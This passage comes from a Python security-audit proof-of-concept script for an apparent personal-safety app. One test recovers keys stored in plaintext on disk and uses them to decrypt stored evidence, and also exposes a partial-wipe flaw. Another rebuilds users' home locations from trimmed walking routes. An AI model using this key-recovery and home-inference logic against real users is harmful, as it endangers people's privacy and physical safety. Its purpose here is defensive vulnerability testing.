        photo = os.path.join(d, "shot1.jpg")
        secret = b"\xff\xd8 attacker face " + os.urandom(64)
        open(photo, "wb").write(secret)
        v = EV.EvidenceVault(os.path.join(d, "vault"))
        sealed = v.seal(photo, "evt1")
        kb = open(os.path.join(d, "vault", "evt1", "key.bin"), "rb").read()
        blob = open(sealed, "rb").read()
        rec = AESGCM(kb[5:]).decrypt(blob[:12], blob[12:], b"evt1/shot1.jpg")
        out["vault_key_file_prefix"] = kb[:5].decode()
        out["vault_decrypted_with_key_from_disk"] = rec == secret
        st = PK.SecureStore(os.path.join(d, "voice"))
        st.put("take_codeword_00", b"secret code word audio")
        kb2 = open(os.path.join(d, "voice", "key.bin"), "rb").read()
        b2 = open(os.path.join(d, "voice", "take_codeword_00.enc"), "rb").read()
        out["kws_decrypted_with_key_from_disk"] = AESGCM(kb2[5:]).decrypt(b2[:12], b2[12:], b"take_codeword_00") \
            == b"secret code word audio"
    finally:
        storage.HAS_DPAPI = old
    # _wipe only overwrites the first 4 MiB
    big = os.path.join(d, "clip.bin")
    data = os.urandom(10 * 2 ** 20)
    open(big, "wb").write(data)
    real_remove = os.remove
    os.remove = lambda p: None
    try:
        EV._wipe(big)
    finally:
        os.remove = real_remove
    after = open(big, "rb").read()
    out["wipe_10MiB_file_bytes_unchanged_after_4MiB"] = after[4 * 2 ** 20:] == data[4 * 2 ** 20:]
    out["wipe_first_4MiB_overwritten"] = after[:4 * 2 ** 20] != data[:4 * 2 ** 20]
    # downgrade: PLAIN accepted even when DPAPI is available
    out["PLAIN_key_accepted_on_windows_with_dpapi"] = EV._dpapi_unprotect(b"PLAIN" + b"k" * 32) == b"k" * 32
    record("client_crypto_plain_key_fallback_and_partial_wipe", "CONFIRMED (conditional)", "Medium", {
        **out, "nonce/AAD": "AES-256-GCM, random 96-bit nonce per file, per-event/per-store key, AAD=event/name -> OK",
        "where": "evidence_vault.py:29-41 (PLAIN), 44-57 (_wipe 4 MiB), 87-96 (key race, no O_EXCL); "
                 "personal_kws.py:40-50 reuses the same fallback"})


def poc_trim_endpoints():
    src = open(os.path.join(ROOT, "route_walk_ui.py"), encoding="utf-8").read()
    fn = next(n for n in ast.parse(src).body if isinstance(n, ast.FunctionDef) and n.name == "trim_endpoints")
    ns = {"TRIM_ENDPOINTS_M": 150}
    exec(compile(ast.Module(body=[fn], type_ignores=[]), "route_walk_ui.py", "exec"), ns)  # the real code, no tkinter
    trim = ns["trim_endpoints"]
    from research_tools.street_vision import haversine_m
    rng = random.Random(5)
    errs = []
    m_lat = 111_320.0
    for k in range(200):
        home = (TLV[0] + rng.uniform(-0.02, 0.02), TLV[1] + rng.uniform(-0.02, 0.02))
        m_lon = 111_320.0 * math.cos(math.radians(home[0]))
        brg = rng.uniform(0, 2 * math.pi)
        obs, x, y, t = [], 0.0, 0.0, 1.7e9
        for i in range(600):                         # ~20 min walk, sample every 2 s, gentle turns, GPS noise 5 m
            brg += rng.gauss(0, 0.03)
            x += 1.3 * 2 * math.sin(brg)
            y += 1.3 * 2 * math.cos(brg)
            t += 2
            obs.append({"lat": home[0] + (y + rng.gauss(0, 5)) / m_lat, "lon": home[1] + (x + rng.gauss(0, 5)) / m_lon,
                        "observed_at": t})
        sent = trim(obs)
        # attacker (server side): direction of the first 20 sent points, step back 150 m (public constant)
        p0, p1 = sent[0], sent[19]
        dy, dx = (p1["lat"] - p0["lat"]) * m_lat, (p1["lon"] - p0["lon"]) * m_lon
        nrm = math.hypot(dx, dy) or 1
        est = (p0["lat"] - 150 * dy / nrm / m_lat, p0["lon"] - 150 * dx / nrm / m_lon)
        errs.append(haversine_m(est, home))
    record("route_walk_trim_endpoints_home_reconstructable", "CONFIRMED", "Medium (privacy)",
           {"walks_simulated": 200, "home_estimate_error_m": summarize(errs, scale=1, unit="m"),
            "share_within_50m": round(sum(e < 50 for e in errs) / len(errs), 2),
            "share_within_100m": round(sum(e < 100 for e in errs) / len(errs), 2),
            "why": "fixed public 150 m radius around the exact first/last fix + full-resolution track and "
                   "observed_at timestamps; multiple walks from the same door intersect even more tightly",
            "where": "route_walk_ui.py:33-44, 275-278; server keeps lat/lon/observed_at (lifeguard_server.py:1750)"})


ALL = {
    "queued_leak": poc_queued_leak, "ring_stall": poc_ring_stall, "vol_identity": poc_volunteer_identity_on_close,
    "escort": poc_escort_after_disconnect, "chat": poc_chat, "sessions": poc_sessions_and_password,
    "lockout": poc_login_lockout, "register": poc_registration, "sybil": poc_sybil_capture,
    "quick_cancel": poc_quick_cancel_gaming, "walks": poc_walks_and_health, "invites": poc_invitation_churn,
    "spam": poc_trusted_notify_and_escort_spam, "streams": poc_many_streams_one_user, "osrm": poc_osrm_blackhole,
    "push": poc_push_queue_starvation, "crypto": poc_vault_and_kws_crypto, "trim": poc_trim_endpoints,
}

if __name__ == "__main__":
    names = sys.argv[1:] or list(ALL)
    for n in names:
        try:
            ALL[n]()
        except Exception as e:  # noqa: BLE001
            import traceback
            traceback.print_exc()
            RESULTS[n] = {"verdict": "ERROR", "detail": repr(e)}
    print("\nsaved:", save_result("sec_pocs_" + ("all" if not sys.argv[1:] else "_".join(names)), RESULTS))
